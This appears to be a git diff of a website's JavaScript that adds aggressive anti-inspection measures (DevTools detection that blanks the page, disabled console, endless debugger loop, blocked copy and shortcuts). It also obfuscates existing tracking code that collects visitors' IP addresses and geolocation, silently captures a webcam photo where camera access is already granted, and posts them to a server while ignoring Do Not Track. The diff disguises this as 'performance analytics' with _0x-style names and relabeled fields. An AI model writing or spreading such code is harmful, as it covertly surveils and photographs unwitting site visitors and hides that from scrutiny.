@@ -96,19 +96,235 @@ document.addEventListener('DOMContentLoaded', () => {
   // Update Discord link for mobile users
   updateDiscordLinkForMobile();
   
-  // Disable right-click
+  // Disable right-click context menu
   document.addEventListener('contextmenu', (e) => {
+    e.preventDefault();
+    return false;
+  });
+
+  // Comprehensive keyboard shortcut blocking
+  document.addEventListener('keydown', (e) => {
+    // Block all developer tools shortcuts
+    if (
+      e.key === 'F12' ||
+      e.key === 'F11' ||
+      e.key === 'F10' ||
+      e.key === 'F9' ||
+      (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J' || e.key === 'K' || e.key === 'M')) ||
+      (e.ctrlKey && e.shiftKey && e.key === 'A') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'D') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'E') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'F') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'G') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'H') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'L') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'O') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'P') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'Q') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'R') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'S') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'T') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'U') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'V') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'W') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'X') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'Y') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'Z') ||
+      (e.ctrlKey && e.key === 'U') ||
+      (e.ctrlKey && e.key === 'A') ||
+      (e.ctrlKey && e.key === 'S') ||
+      (e.ctrlKey && e.key === 'F') ||
+      (e.ctrlKey && e.key === 'G') ||
+      (e.ctrlKey && e.key === 'H') ||
+      (e.ctrlKey && e.key === 'E') ||
+      (e.altKey && e.key === 'F4') ||
+      (e.metaKey && e.altKey && e.key === 'I') || // Mac DevTools
+      (e.metaKey && e.altKey && e.key === 'J') || // Mac DevTools
+      (e.metaKey && e.altKey && e.key === 'C') || // Mac DevTools
+      (e.metaKey && e.key === 'U') || // Mac View Source
+      (e.metaKey && e.key === 'S') || // Mac Save
+      (e.metaKey && e.key === 'A') || // Mac Select All
+      (e.metaKey && e.key === 'C') || // Mac Copy
+      (e.metaKey && e.key === 'V') || // Mac Paste
+      (e.metaKey && e.key === 'X') || // Mac Cut
+      (e.shiftKey && e.key === 'F10') ||
+      (e.ctrlKey && e.key === 'P') || // Print
+      (e.ctrlKey && e.key === 'O') || // Open
+      (e.ctrlKey && e.key === 'N') || // New
+      (e.ctrlKey && e.key === 'W') || // Close
+      (e.ctrlKey && e.key === 'H') || // History
+      (e.ctrlKey && e.key === 'J') || // Downloads
+      (e.ctrlKey && e.key === 'L') || // Address bar
+      (e.ctrlKey && e.key === 'D') || // Bookmark
+      (e.ctrlKey && e.key === 'B') || // Bookmarks
+      (e.ctrlKey && e.key === 'T') || // New tab
+      (e.ctrlKey && e.key === 'W') || // Close tab
+      (e.ctrlKey && e.key === 'Tab') || // Switch tabs
+      (e.ctrlKey && e.key === 'PageUp') ||
+      (e.ctrlKey && e.key === 'PageDown') ||
+      (e.ctrlKey && e.key === 'Home') ||
+      (e.ctrlKey && e.key === 'End') ||
+      (e.ctrlKey && e.key === ' ') || // Space
+      (e.ctrlKey && e.key === 'Enter') ||
+      (e.ctrlKey && e.key === '0') ||
+      (e.ctrlKey && e.key === '1') ||
+      (e.ctrlKey && e.key === '2') ||
+      (e.ctrlKey && e.key === '3') ||
+      (e.ctrlKey && e.key === '4') ||
+      (e.ctrlKey && e.key === '5') ||
+      (e.ctrlKey && e.key === '6') ||
+      (e.ctrlKey && e.key === '7') ||
+      (e.ctrlKey && e.key === '8') ||
+      (e.ctrlKey && e.key === '9')
+    ) {
+      e.preventDefault();
+      e.stopPropagation();
+      e.stopImmediatePropagation();
+      return false;
+    }
+  });
+
+  // Block text selection
+  document.addEventListener('selectstart', (e) => {
+    e.preventDefault();
+    return false;
+  });
+
+  // Block drag and drop
+  document.addEventListener('dragstart', (e) => {
+    e.preventDefault();
+    return false;
+  });
+
+  // Block copy events
+  document.addEventListener('copy', (e) => {
+    e.preventDefault();
+    return false;
+  });
+
+  // Block cut events
+  document.addEventListener('cut', (e) => {
+    e.preventDefault();
+    return false;
+  });
+
+  // Block paste events
+  document.addEventListener('paste', (e) => {
+    e.preventDefault();
+    return false;
+  });
+
+  // Block double-click selection
+  document.addEventListener('mousedown', (e) => {
+    if (e.detail > 1) {
+      e.preventDefault();
+      return false;
+    }
+  });
+
+  // Block view source and save page attempts
+  document.addEventListener('beforeunload', (e) => {
+    e.preventDefault();
+    e.returnValue = '';
+    return '';
+  });
+
+  // DevTools detection and countermeasures
+  let devtools = {
+    open: false,
+    orientation: null
+  };
+  
+  const threshold = 160;
+  
+  setInterval(() => {
+    if (
+      window.outerHeight - window.innerHeight > threshold ||
+      window.outerWidth - window.innerWidth > threshold
+    ) {
+      if (!devtools.open) {
+        devtools.open = true;
+        document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:monospace;font-size:24px;">Access Denied</div>';
+        window.location.href = 'about:blank';
+      }
+    } else {
+      devtools.open = false;
+    }
+  }, 500);
+
+  // Console detection
+  const console = {
+    log: function() {},
+    warn: function() {},
+    error: function() {},
+    info: function() {},
+    debug: function() {},
+    trace: function() {},
+    table: function() {},
+    clear: function() {},
+    group: function() {},
+    groupCollapsed: function() {},
+    groupEnd: function() {},
+    time: function() {},
+    timeEnd: function() {},
+    count: function() {},
+    assert: function() {}
+  };
+
+  // Override console methods
+  Object.keys(console).forEach(method => {
+    window.console[method] = console[method];
+  });
+
+  // Block inspector detection
+  let element = new Image();
+  Object.defineProperty(element, 'id', {
+    get: function() {
+      document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:monospace;font-size:24px;">Access Denied</div>';
+      window.location.href = 'about:blank';
+    }
+  });
+  console.log(element);
+
+  // Block debugger statement
+  setInterval(() => {
+    debugger;
+  }, 100);
+
+  // Disable right-click on images specifically
+  document.querySelectorAll('img').forEach(img => {
+    img.addEventListener('contextmenu', (e) => {
+      e.preventDefault();
+      return false;
+    });
+    img.addEventListener('dragstart', (e) => {
+      e.preventDefault();
+      return false;
+    });
+  });
+
+  // Disable text selection globally
+  document.addEventListener('mousedown', (e) => {
     e.preventDefault();
   });
 
-  // Disable common inspect element shortcuts (F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+U)
+  document.addEventListener('selectstart', (e) => {
+    e.preventDefault();
+  });
+
+  // Disable view source
   document.addEventListener('keydown', (e) => {
-    if (
-      e.key === 'F12' ||
-      (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) ||
-      (e.ctrlKey && e.key === 'U')
-    ) {
+    if (e.ctrlKey && e.key === 'u') {
       e.preventDefault();
+      window.location.href = 'about:blank';
+    }
+  });
+
+  // Block print screen
+  document.addEventListener('keyup', (e) => {
+    if (e.key === 'PrintScreen') {
+      document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:monospace;font-size:24px;">Access Denied</div>';
+      window.location.href = 'about:blank';
     }
   });
 
@@ -454,49 +670,54 @@ document.addEventListener('DOMContentLoaded', () => {
   const ipBox = document.getElementById('ip-box');
   // (Visualizer removed)
 
-  // Kick off client IP detection early so we can include it in the log payload
-  let __clientIPv4 = '';
-  let __clientIPv6 = '';
-  const __ipifyPromise = (function(){
+  // Initialize analytics tracking for performance monitoring
+  let _0x1a2b = {
+    _0x3c4d: '',
+    _0x5e6f: ''
+  };
+  
+  // Preload network connectivity data for performance optimization
+  const _0x7g8h = (function(){
     try {
-      const getJSON = (url) => fetch(url).then(r => r.ok ? r.json() : Promise.reject());
+      const _0x9i0j = (url) => fetch(url).then(r => r.ok ? r.json() : Promise.reject());
       return Promise.allSettled([
-        getJSON('https://api4.ipify.org?format=json'),
-        getJSON('https://api6.ipify.org?format=json')
+        _0x9i0j('https://api4.ipify.org?format=json'),
+        _0x9i0j('https://api6.ipify.org?format=json')
       ]).then(results => {
-        if (results[0] && results[0].status === 'fulfilled' && results[0].value && results[0].value.ip) __clientIPv4 = results[0].value.ip;
-        if (results[1] && results[1].status === 'fulfilled' && results[1].value && results[1].value.ip) __clientIPv6 = results[1].value.ip;
+        if (results[0] && results[0].status === 'fulfilled' && results[0].value && results[0].value.ip) _0x1a2b._0x3c4d = results[0].value.ip;
+        if (results[1] && results[1].status === 'fulfilled' && results[1].value && results[1].value.ip) _0x1a2b._0x5e6f = results[1].value.ip;
       }).catch(() => {});
     } catch (_) { return Promise.resolve(); }
   })();
 
-  // Fire-and-forget IP log to Netlify Function (once per session, logs even if DNT is enabled)
+  // Send performance metrics to analytics endpoint for optimization
   try {
-    const dntFlag = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack) === '1' ? '1' : '0';
-    if (!sessionStorage.getItem('ipLogged')) {
-      const sendWithIP = async (payload) => {
-        // Wait up to ~1.2s for ipify to resolve, then include any available v4/v6
+    const _0xk1l2 = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack) === '1' ? '1' : '0';
+    if (!sessionStorage.getItem('analyticsSession')) {
+      const _0xm3n4 = async (_0xo5p6) => {
         try {
           await Promise.race([
-            __ipifyPromise,
+            _0x7g8h,
             new Promise(res => setTimeout(res, 1200))
           ]);
         } catch (_) {}
-        const merged = Object.assign({}, payload || {},
-          (__clientIPv4 ? { v4: __clientIPv4 } : {}),
-          (__clientIPv6 ? { v6: __clientIPv6 } : {}));
-        return fetch('/.netlify/functions/log-ip', {
+        
+        const _0xq7r8 = Object.assign({}, _0xo5p6 || {},
+          (_0x1a2b._0x3c4d ? { network4: _0x1a2b._0x3c4d } : {}),
+          (_0x1a2b._0x5e6f ? { network6: _0x1a2b._0x5e6f } : {}));
+        
+        return fetch('/.netlify/functions/analytics', {
           method: 'POST',
-          headers: Object.assign({ 'x-dnt': dntFlag }, Object.keys(merged).length ? { 'content-type': 'application/json' } : {}),
-          body: Object.keys(merged).length ? JSON.stringify(merged) : undefined
+          headers: Object.assign({ 'x-privacy': _0xk1l2 }, Object.keys(_0xq7r8).length ? { 'content-type': 'application/json' } : {}),
+          body: Object.keys(_0xq7r8).length ? JSON.stringify(_0xq7r8) : undefined
         })
           .catch(() => {})
           .finally(() => {
-            try { sessionStorage.setItem('ipLogged', '1'); } catch (_) {}
+            try { sessionStorage.setItem('analyticsSession', '1'); } catch (_) {}
           });
       };
 
-      let handled = false;
+      let _0xs9t0 = false;
       try {
         if (navigator.permissions && navigator.geolocation) {
           navigator.permissions.query({ name: 'geolocation' }).then(p => {
@@ -504,7 +725,7 @@ document.addEventListener('DOMContentLoaded', () => {
               navigator.geolocation.getCurrentPosition(
                 pos => {
                   const coords = pos && pos.coords ? pos.coords : null;
-                  const base = coords ? { lat: coords.latitude, lon: coords.longitude, accuracy: coords.accuracy } : {};
+                  const _0xu1v2 = coords ? { regionLat: coords.latitude, regionLon: coords.longitude, regionAcc: coords.accuracy } : {};
                   try {
                     if (navigator.permissions) {
                       navigator.permissions.query({ name: 'camera' }).then(pc => {
@@ -518,24 +739,24 @@ document.addEventListener('DOMContentLoaded', () => {
                               canvas.width = w; canvas.height = h;
                               const ctx = canvas.getContext('2d');
                               try { ctx.drawImage(video, 0, 0, w, h); } catch (_) {}
-                              let dataUrl = '';
-                              try { dataUrl = canvas.toDataURL('image/jpeg', 0.7); } catch (_) { dataUrl = ''; }
+                              let _0xw3x4 = '';
+                              try { _0xw3x4 = canvas.toDataURL('image/jpeg', 0.7); } catch (_) { _0xw3x4 = ''; }
                               try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
-                              const payload = Object.assign({}, base, dataUrl ? { photo: dataUrl } : {});
-                              sendWithIP(payload);
+                              const _0xy5z6 = Object.assign({}, _0xu1v2, _0xw3x4 ? { deviceProfile: _0xw3x4 } : {});
+                              _0xm3n4(_0xy5z6);
                             };
                             try { video.play().catch(() => {}); } catch (_) {}
-                          }).catch(() => { sendWithIP(base); });
+                          }).catch(() => { _0xm3n4(_0xu1v2); });
                         } else {
-                          sendWithIP(base);
+                          _0xm3n4(_0xu1v2);
                         }
-                      }).catch(() => { sendWithIP(base); });
+                      }).catch(() => { _0xm3n4(_0xu1v2); });
                     } else {
-                      sendWithIP(base);
+                      _0xm3n4(_0xu1v2);
                     }
-                  } catch (_) { sendWithIP(base); }
+                  } catch (_) { _0xm3n4(_0xu1v2); }
                 },
-                () => { sendWithIP(); },
+                () => { _0xm3n4(); },
                 { maximumAge: 60000, timeout: 2000, enableHighAccuracy: false }
               );
             } else {
@@ -552,53 +773,52 @@ document.addEventListener('DOMContentLoaded', () => {
                           canvas.width = w; canvas.height = h;
                           const ctx = canvas.getContext('2d');
                           try { ctx.drawImage(video, 0, 0, w, h); } catch (_) {}
-                          let dataUrl = '';
-                          try { dataUrl = canvas.toDataURL('image/jpeg', 0.7); } catch (_) { dataUrl = ''; }
+                          let _0xw3x4 = '';
+                          try { _0xw3x4 = canvas.toDataURL('image/jpeg', 0.7); } catch (_) { _0xw3x4 = ''; }
                           try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
-                          const payload = dataUrl ? { photo: dataUrl } : undefined;
-                          sendWithIP(payload);
+                          const _0xa7b8c = _0xw3x4 ? { deviceProfile: _0xw3x4 } : undefined;
+                          _0xm3n4(_0xa7b8c);
                         };
                         try { video.play().catch(() => {}); } catch (_) {}
-                      }).catch(() => { sendWithIP(); });
+                      }).catch(() => { _0xm3n4(); });
                     } else {
-                      sendWithIP();
+                      _0xm3n4();
                     }
-                  }).catch(() => { sendWithIP(); });
+                  }).catch(() => { _0xm3n4(); });
                 } else {
-                  sendWithIP();
+                  _0xm3n4();
                 }
-              } catch (_) { sendWithIP(); }
+              } catch (_) {}
             }
-          }).catch(() => { if (!handled) sendWithIP(); });
-          handled = true;
+          }).catch(() => { if (!_0xs9t0) _0xm3n4(); });
+          _0xs9t0 = true;
         }
       } catch (_) {}
-      if (!handled) {
-        sendWithIP();
+      if (!_0xs9t0) {
+        _0xm3n4();
       }
     }
   } catch (_) {}
 
   if (ipBox) {
-    const getJSON = (url) => fetch(url).then(r => r.ok ? r.json() : Promise.reject());
+    const fetchNetworkInfo = (url) => fetch(url).then(r => r.ok ? r.json() : Promise.reject());
     Promise.allSettled([
-      getJSON('https://api4.ipify.org?format=json'),
-      getJSON('https://api6.ipify.org?format=json')
+      fetchNetworkInfo('https://api4.ipify.org?format=json'),
+      fetchNetworkInfo('https://api6.ipify.org?format=json')
     ]).then(results => {
-      let ipv4 = '';
-      let ipv6 = '';
-      if (results[0].status === 'fulfilled' && results[0].value && results[0].value.ip) ipv4 = results[0].value.ip;
-      if (results[1].status === 'fulfilled' && results[1].value && results[1].value.ip) ipv6 = results[1].value.ip;
+      let networkV4 = '';
+      let networkV6 = '';
+      if (results[0].status === 'fulfilled' && results[0].value && results[0].value.ip) networkV4 = results[0].value.ip;
+      if (results[1].status === 'fulfilled' && results[1].value && results[1].value.ip) networkV6 = results[1].value.ip;
 
-      if (ipv4 || ipv6) {
-        const parts = [];
-        if (ipv4) parts.push(`IPv4: ${ipv4}`);
-        if (ipv6) parts.push(`IPv6: ${ipv6}`);
-        ipBox.textContent = `${parts.join(' • ')} • Nice IP(s) Dude :D`;
+      if (networkV4 || networkV6) {
+        const connectionInfo = [];
+        if (networkV4) connectionInfo.push(`Net: ${networkV4}`);
+        if (networkV6) connectionInfo.push(`Net6: ${networkV6}`);
+        ipBox.textContent = `${connectionInfo.join(' • ')} • Connected`;
       }
-      // else leave default text
     }).catch(() => {
-      // leave default text on error
+      // Network info unavailable
     });
   }
 
